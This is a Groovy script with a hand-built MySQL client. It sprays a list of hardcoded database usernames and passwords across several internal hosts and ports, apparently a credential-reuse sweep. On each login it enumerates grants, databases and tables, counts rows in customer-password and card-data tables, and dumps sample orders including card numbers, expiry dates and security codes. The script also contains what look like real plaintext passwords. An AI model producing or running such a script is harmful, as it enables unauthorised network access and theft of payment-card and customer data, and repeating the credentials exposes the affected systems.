import java.net.Socket
import java.net.InetSocketAddress
import java.security.MessageDigest

class Cur3 {
  byte[] d; int i = 0
  long lenenc() {
    int b = d[i] & 0xFF; i++
    if (b < 0xFB) return (long) b
    if (b == 0xFC) { long v = (d[i] & 0xFF) | ((d[i+1] & 0xFF) << 8); i += 2; return v }
    if (b == 0xFD) { long v = (d[i] & 0xFF) | ((d[i+1] & 0xFF) << 8) | ((d[i+2] & 0xFF) << 16); i += 3; return v }
    long v = 0; for (int k = 0; k < 8; k++) { v |= ((long)(d[i+k] & 0xFF)) << (8*k) }; i += 8; return v
  }
  String lenstr() {
    int fb = d[i] & 0xFF
    if (fb == 0xFB) { i++; return null }
    long l = lenenc(); String s = new String(d, i, (int)l, 'UTF-8'); i += (int)l; return s
  }
}
class MC3 {
  DataInputStream ins; BufferedOutputStream outs; Socket sock; String serverVersion = ""
  byte[] readPacket() {
    int len = (ins.readUnsignedByte()) | (ins.readUnsignedByte() << 8) | (ins.readUnsignedByte() << 16)
    ins.readUnsignedByte(); byte[] pl = new byte[len]; ins.readFully(pl); return pl
  }
  void writePacket(int seq, byte[] pl) {
    int len = pl.length
    outs.write(len & 0xFF); outs.write((len >> 8) & 0xFF); outs.write((len >> 16) & 0xFF); outs.write(seq & 0xFF)
    outs.write(pl); outs.flush()
  }
  String connectAndAuth(String host, int port, String user, String pass) {
    try {
      sock = new Socket(); sock.connect(new InetSocketAddress(host, port), 6000); sock.setSoTimeout(20000)
      ins = new DataInputStream(new BufferedInputStream(sock.getInputStream()))
      outs = new BufferedOutputStream(sock.getOutputStream())
      byte[] p = readPacket()
      if ((p[0] & 0xFF) != 10) return "BAD_PROTO"
      int i = 1; StringBuilder sb = new StringBuilder()
      while (p[i] != 0) { sb.append((char)(p[i] & 0xFF)); i++ }; serverVersion = sb.toString(); i++; i += 4
      byte[] salt1 = new byte[8]; System.arraycopy(p, i, salt1, 0, 8); i += 8
      i++; i += 2; i++; i += 2; i += 2
      int authLen = (p[i] & 0xFF); i++; i += 10
      int salt2Len = Math.max(13, authLen - 8)
      def salt2List = []; int avail = p.length - i
      for (int k = 0; k < Math.min(salt2Len, avail); k++) { if (p[i+k] != 0) salt2List.add(p[i+k]) }
      byte[] seed = new byte[8 + salt2List.size()]; System.arraycopy(salt1, 0, seed, 0, 8)
      for (int k = 0; k < salt2List.size(); k++) seed[8+k] = (byte)salt2List[k]
      def md = MessageDigest.getInstance('SHA-1')
      byte[] s1 = md.digest(pass.getBytes('UTF-8')); byte[] s2 = md.digest(s1)
      md.reset(); md.update(seed); md.update(s2); byte[] s3 = md.digest()
      byte[] token = new byte[20]
      for (int j = 0; j < 20; j++) token[j] = (byte)((s1[j] ^ s3[j]) & 0xFF)
      int caps = 0x1 | 0x200 | 0x2000 | 0x8000 | 0x80000 | 0x20000
      ByteArrayOutputStream baos = new ByteArrayOutputStream()
      baos.write(caps & 0xFF); baos.write((caps >> 8) & 0xFF); baos.write((caps >> 16) & 0xFF); baos.write((caps >> 24) & 0xFF)
      baos.write(0); baos.write(0); baos.write(0); baos.write(1); baos.write(33); baos.write(new byte[23])
      baos.write(user.getBytes('UTF-8')); baos.write(0); baos.write(token.length); baos.write(token)
      baos.write('mysql_native_password'.getBytes('UTF-8')); baos.write(0)
      writePacket(1, baos.toByteArray())
      byte[] ap = readPacket(); int at = ap[0] & 0xFF
      if (at == 0xFF) { int code = (ap[1] & 0xFF) | ((ap[2] & 0xFF) << 8); return "AUTH_ERR_" + code + ": " + new String(ap, 3, ap.length - 3, 'UTF-8') }
      return "AUTH_OK:" + serverVersion
    } catch (Exception e) { return "CONN_ERR: " + e.getMessage() }
  }
  String query(String q) {
    try {
      ByteArrayOutputStream qb = new ByteArrayOutputStream(); qb.write(0x03); qb.write(q.getBytes('UTF-8'))
      writePacket(0, qb.toByteArray()); byte[] rp = readPacket(); int b0 = rp[0] & 0xFF
      if (b0 == 0xFF) { int code = (rp[1] & 0xFF) | ((rp[2] & 0xFF) << 8); return "ERR " + code + ": " + new String(rp, 3, rp.length - 3, 'UTF-8') }
      if (b0 == 0x00) return "OK"
      Cur3 c0 = new Cur3(d: rp); long colCount = c0.lenenc()
      def colNames = []
      for (int ci = 0; ci < colCount; ci++) { byte[] cp = readPacket(); Cur3 cc = new Cur3(d: cp); for (int skip = 0; skip < 4; skip++) { cc.lenstr() }; colNames.add(cc.lenstr()) }
      readPacket()
      def rows = []; int guard = 0
      while (guard++ < 500) {
        byte[] rp2 = readPacket(); int rb = rp2[0] & 0xFF
        if (rb == 0xFE && rp2.length < 9) break
        if (rb == 0xFF) { rows.add(["ROWERR"]); break }
        Cur3 rc = new Cur3(d: rp2); def vals = []
        for (int ci = 0; ci < colCount; ci++) { def v = rc.lenstr(); vals.add(v == null ? "NULL" : v.take(150)) }
        rows.add(vals)
      }
      StringBuilder res = new StringBuilder()
      res.append("COLS[" + colNames.join("|") + "]")
      rows.each { res.append("\nROW[" + it.join("|") + "]") }
      return res.toString()
    } catch (Exception e) { return "QUERY_ERR: " + e.getMessage() }
  }
  void closeConn() { try { sock?.close() } catch (Exception ignored) {} }
}

// ==== STEP 1: v_ventas_dia (limited but available) ====
println "=== STEP 1: v_ventas_dia via dbsmartinsight =="
def mc1 = new MC3()
def r1 = mc1.connectAndAuth('172.27.141.6', 3308, 'dbsmartinsight', 'CD49uwg*iG9m5d+y')
println "AUTH: $r1"
if (r1.startsWith('AUTH_OK')) {
  println "COUNT v_ventas_dia: " + mc1.query("SELECT COUNT(*) FROM tienda.v_ventas_dia")
  println "COLS v_ventas_dia: " + mc1.query("DESCRIBE tienda.v_ventas_dia")
  println "SAMPLE v_ventas_dia (10 rows): " + mc1.query("SELECT * FROM tienda.v_ventas_dia LIMIT 10")
}
mc1.closeConn()

// ==== STEP 2: Try dbcronproductos on all tienda ports ====
println "\n=== STEP 2: dbcronproductos on tienda ports ==="
def creds2 = [
  [host: '172.27.141.6',   port: 3306, user: 'dbcronproductos', pass: '0c1A0ZW0Kh#wjqdRHV$b63A'],
  [host: '172.27.141.6',   port: 3308, user: 'dbcronproductos', pass: '0c1A0ZW0Kh#wjqdRHV$b63A'],
  [host: '172.27.141.6',   port: 3310, user: 'dbcronproductos', pass: '0c1A0ZW0Kh#wjqdRHV$b63A'],
  [host: '172.27.141.6',   port: 3312, user: 'dbcronproductos', pass: '0c1A0ZW0Kh#wjqdRHV$b63A'],
  [host: '172.27.140.143', port: 3312, user: 'dbcronproductos', pass: '0c1A0ZW0Kh#wjqdRHV$b63A'],
  [host: '172.27.141.6',   port: 3312, user: 'app_t1',          pass: 'jpTSf99UzLxC#t>'],
  [host: '172.27.141.6',   port: 3312, user: 'app_t1',          pass: 'pySY8}7>ftpPz9S'],
  [host: '172.27.141.6',   port: 3312, user: 'adaxxidb',        pass: 'JTQ6PrkecY3y1kVN'],
  [host: '172.27.141.24',  port: 3308, user: 'dbcronproductos', pass: '0c1A0ZW0Kh#wjqdRHV$b63A'],
  [host: '172.27.141.24',  port: 3308, user: 'dbsmartinsight',  pass: 'CD49uwg*iG9m5d+y'],
  [host: '172.27.141.24',  port: 3308, user: 'app_t1',          pass: 'jpTSf99UzLxC#t>'],
  [host: '172.27.141.4',   port: 3308, user: 'dbsmartinsight',  pass: 'CD49uwg*iG9m5d+y'],
  [host: '172.27.141.4',   port: 3312, user: 'app_t1',          pass: 'jpTSf99UzLxC#t>'],
  [host: '172.27.141.4',   port: 3306, user: 'dbsmartinsight',  pass: 'CD49uwg*iG9m5d+y'],
]
creds2.each { c ->
  def mc = new MC3()
  def r = mc.connectAndAuth(c.host, c.port, c.user, c.pass)
  println "  ${c.user}@${c.host}:${c.port} → $r"
  if (r.startsWith('AUTH_OK')) {
    println "  GRANTS: " + mc.query("SHOW GRANTS FOR CURRENT_USER()")
    println "  DATABASES: " + mc.query("SHOW DATABASES")
    println "  TABLES tienda: " + mc.query("SHOW TABLES FROM tienda")
    def key_tables = ['pedidos','clientes','clientescontrasena','datostarjeta','cybersource_transacciones','usuarios','bines']
    key_tables.each { t ->
      def cnt = mc.query("SELECT COUNT(*) FROM tienda.${t}")
      if (!cnt.contains('ERR')) println "  COUNT(tienda.${t}): $cnt"
    }
    println "  SAMPLE pedidos: " + mc.query("SELECT idpedido,fechapedido,total,tipotarjeta,nombre,numero,mes,ao,seguridad FROM tienda.pedidos LIMIT 5")
  }
  mc.closeConn()
}

println "\n=== FIN ==="
